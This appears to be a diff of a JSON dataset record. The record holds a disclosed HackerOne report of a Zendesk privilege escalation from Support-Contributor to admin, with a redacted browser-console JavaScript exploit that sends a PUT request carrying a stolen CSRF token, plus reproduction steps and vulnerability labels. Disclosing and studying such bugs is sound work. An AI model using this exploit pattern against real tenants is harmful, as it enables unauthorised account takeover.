@@ -1,48 +1,48 @@
 {
-    "reported_to": "Zendesk",
-    "reported_by": "cybxis ",
-    "title": "Privilege escalation - Support-Contributor to Support and Product Admin via `/api/v2/\u2588\u2588\u2588\u2588\u2588\u2588` . No ADMIN PRIVILEGE required.",
-    "content": "\nHello team, I am reporting another privilege escalation issue where a lowest privilege member(Support-Contributor) to full Support and Product administrator. Tested in Zendesk Enterprise(Sponsored) and Trial Account.\nFrom my past reports I was able to find privilege escalation issues on the endpoint /api/\u2588\u2588\u2588 . The difference is, to perform a privilege escalation on the said endpoint, there should be at least one Product Admin privilege on the actor's account but this report does not require any Admin privilege(just the lowest privilege alone).\nSummary:\nThe Contributor Role is the lowest Support role in Zendesk. In the UI alone, as a contributor, the accessible pages and and endpoints are very limited. With this role, the members page is not even accessible or restricted. With these restrictions, escalating your own role seem to be impossible.\nImproper Access Control to Privilege Escalation\nVulnerable Endpoint: PUT /api\u2588\u2588\u2588 HTTP/2\nThe /api\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 endpoint is used for API integration to \u2588\u2588\u2588\u2588\u2588. \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 . However, the said endpoint does not validate the privilege of the user who is sending a request. With this bug, a member with even just the lowest privilege(Contributor) is able to escalate any members' privilege to FULL ADMINISTRATOR including its own privilege.\nBrowsers Verified In:\nLatest version of Chrome and Firefox\nExploit\nCode 906 Bytes\n1//Exploit\n2//get csrf token and id\n3var xhttp = new XMLHttpRequest();\n4xhttp.onreadystatechange = function() {\n5    if (this.readyState == 4 && this.status == 200) {\n6        var profile = JSON.parse(this.responseText);\n7        var csrf = profile.user.authenticity_token;\n8\t\tvar id = profile.user.id;\n9        escalate(id, csrf);\n10    }\n11};\n12\n13xhttp.open(\"GET\", \"https://\" + document.domain + \"/api/v2/users/me.json\");\n14xhttp.send();\n15\n16\n17//privilege escalation function\n18function escalate(id, csrf) {\n19    var xhttp = new XMLHttpRequest();\n20    xhttp.onreadystatechange = function() {\n21        if (this.readyState == 4 && this.status == 200) {\n22            console.log(this.responseText);\n23        }\n24    };\n25\n26    xhttp.open(\"PUT\", \"https://\" + document.domain + \"/api\u2588\u2588\u2588\u2588\u2588\u2588;\n27    xhttp.setRequestHeader(\"X-Csrf-Token\", csrf);\n28    xhttp.setRequestHeader(\"Content-Type\", \"application/json\");\n29    xhttp.send(JSON.stringify(\u2588\u2588\u2588));\n30}\nSteps To Reproduce:\nOn owner/admin account\nGo to https://<domain>.zendesk.com/admin/people/team/members/new\nProvide the name and email of the agent\nClick Next\nSet the Support role to CONTRIBUTOR\nGo to https://<domain>.zendesk.com/admin/people/team/members\nClick the profile on the invited user\nNow set the roles to Support-Contributor only and DISABLE any product access(just to prove that no other privilege is required).\nOn invited user\n8. You will receive an email. Click it to accept the invitation\n9. Login the invited account\n10. Execute the exploit to escalate your privileges.\nDemo And PoC\nOn Enterprise account\n\u2588\u2588\u2588\nOn Trial account\n\u2588\u2588\u2588\nImpact\nPrivilege escalation - Support-Contributor to Support and Product Admin.\n\n",
-    "severity": [
-        8.8,
-        null
+  "reported_to": "Zendesk",
+  "reported_by": "cybxis ",
+  "title": "Privilege escalation - Support-Contributor to Support and Product Admin via `/api/v2/\u2588\u2588\u2588\u2588\u2588\u2588` . No ADMIN PRIVILEGE required.",
+  "content": "\nHello team, I am reporting another privilege escalation issue where a lowest privilege member(Support-Contributor) to full Support and Product administrator. Tested in Zendesk Enterprise(Sponsored) and Trial Account.\nFrom my past reports I was able to find privilege escalation issues on the endpoint /api/\u2588\u2588\u2588 . The difference is, to perform a privilege escalation on the said endpoint, there should be at least one Product Admin privilege on the actor's account but this report does not require any Admin privilege(just the lowest privilege alone).\nSummary:\nThe Contributor Role is the lowest Support role in Zendesk. In the UI alone, as a contributor, the accessible pages and and endpoints are very limited. With this role, the members page is not even accessible or restricted. With these restrictions, escalating your own role seem to be impossible.\nImproper Access Control to Privilege Escalation\nVulnerable Endpoint: PUT /api\u2588\u2588\u2588 HTTP/2\nThe /api\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 endpoint is used for API integration to \u2588\u2588\u2588\u2588\u2588. \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 . However, the said endpoint does not validate the privilege of the user who is sending a request. With this bug, a member with even just the lowest privilege(Contributor) is able to escalate any members' privilege to FULL ADMINISTRATOR including its own privilege.\nBrowsers Verified In:\nLatest version of Chrome and Firefox\nExploit\nCode 906 Bytes\n1//Exploit\n2//get csrf token and id\n3var xhttp = new XMLHttpRequest();\n4xhttp.onreadystatechange = function() {\n5    if (this.readyState == 4 && this.status == 200) {\n6        var profile = JSON.parse(this.responseText);\n7        var csrf = profile.user.authenticity_token;\n8\t\tvar id = profile.user.id;\n9        escalate(id, csrf);\n10    }\n11};\n12\n13xhttp.open(\"GET\", \"https://\" + document.domain + \"/api/v2/users/me.json\");\n14xhttp.send();\n15\n16\n17//privilege escalation function\n18function escalate(id, csrf) {\n19    var xhttp = new XMLHttpRequest();\n20    xhttp.onreadystatechange = function() {\n21        if (this.readyState == 4 && this.status == 200) {\n22            console.log(this.responseText);\n23        }\n24    };\n25\n26    xhttp.open(\"PUT\", \"https://\" + document.domain + \"/api\u2588\u2588\u2588\u2588\u2588\u2588;\n27    xhttp.setRequestHeader(\"X-Csrf-Token\", csrf);\n28    xhttp.setRequestHeader(\"Content-Type\", \"application/json\");\n29    xhttp.send(JSON.stringify(\u2588\u2588\u2588));\n30}\nSteps To Reproduce:\nOn owner/admin account\nGo to https://<domain>.zendesk.com/admin/people/team/members/new\nProvide the name and email of the agent\nClick Next\nSet the Support role to CONTRIBUTOR\nGo to https://<domain>.zendesk.com/admin/people/team/members\nClick the profile on the invited user\nNow set the roles to Support-Contributor only and DISABLE any product access(just to prove that no other privilege is required).\nOn invited user\n8. You will receive an email. Click it to accept the invitation\n9. Login the invited account\n10. Execute the exploit to escalate your privileges.\nDemo And PoC\nOn Enterprise account\n\u2588\u2588\u2588\nOn Trial account\n\u2588\u2588\u2588\nImpact\nPrivilege escalation - Support-Contributor to Support and Product Admin.\n\n",
+  "severity": [
+    8.8,
+    null
+  ],
+  "bounty": 2000,
+  "weaknesses": [
+    "Privilege Escalation"
+  ],
+  "screenshots": {},
+  "disclosed_date": 1702947900,
+  "report_url": "https://hackerone.com/reports/2188569",
+  "is_multi_component": true,
+  "complexity": "HIGH",
+  "novelty": "MEDIUM",
+  "vuln_category": "API",
+  "steps": [
+    [
+      1,
+      "Create a new user with the lowest privilege (Support-Contributor) in Zendesk."
     ],
-    "bounty": 2000,
-    "weaknesses": [
-        "Privilege Escalation"
-    ],
-    "screenshots": {},
-    "disclosed_date": 1702947900,
-    "report_url": "https://hackerone.com/reports/2188569",
-    "is_multi_component": true,
-    "complexity": "HIGH",
-    "novelty": "MEDIUM",
-    "vuln_category": "API",
-    "steps": [
-        [
-            1,
-            "Create a new user with the lowest privilege (Support-Contributor) in Zendesk."
-        ],
-        [
-            2,
-            "Execute the exploit code in the browser's console to escalate privileges to Support and Product Admin."
-        ]
-    ],
-    "vuln_description": "A privilege escalation vulnerability allows a user with the lowest privilege (Support-Contributor) to elevate their own or others' privileges to full Support and Product Administrator by exploiting an improperly secured API endpoint.",
-    "reason": "The vulnerability involves a straightforward exploitation of an API endpoint that lacks proper privilege validation. The attack does not require complex interactions or understanding of multiple components, making it relatively easy to discover and exploit.",
-    "new_complexity": "LOW",
-    "requires_code": false,
-    "requires_CVE": false,
-    "is_ctf": false,
-    "other_report": null,
-    "idor_detectable": true,
-    "authnz_byppass_detectable": true,
-    "is_simple_payload": false,
-    "injection_metadata": {
-        "is_simple_payload": false
-    },
-    "authnz_metadata": {
-        "idor_detectable": true,
-        "authnz_byppass_detectable": true
-    }
+    [
+      2,
+      "Execute the exploit code in the browser's console to escalate privileges to Support and Product Admin."
+    ]
+  ],
+  "vuln_description": "A privilege escalation vulnerability allows a user with the lowest privilege (Support-Contributor) to elevate their own or others' privileges to full Support and Product Administrator by exploiting an improperly secured API endpoint.",
+  "reason": "The vulnerability involves a straightforward exploitation of an API endpoint that lacks proper privilege validation. The attack does not require complex interactions or understanding of multiple components, making it relatively easy to discover and exploit.",
+  "new_complexity": "LOW",
+  "requires_code": false,
+  "requires_CVE": false,
+  "is_ctf": false,
+  "other_report": null,
+  "idor_detectable": true,
+  "authnz_byppass_detectable": true,
+  "is_simple_payload": false,
+  "injection_metadata": {
+    "is_simple_payload": false
+  },
+  "authnz_metadata": {
+    "reason": "The vulnerability involves an improper access control issue where a low-privileged user can escalate their privileges by making a PUT request to a specific API endpoint without proper validation. This falls under the AuthZ Bypass category, where the methodology involves swapping user sessions and testing actions that should be restricted. The exploit involves using the authenticated session of a low-privileged user to perform an action (privilege escalation) that should be restricted to higher-privileged users, which aligns with the detection method of swapping user sessions and testing actions.",
+    "is_detectable": true
+  }
 }
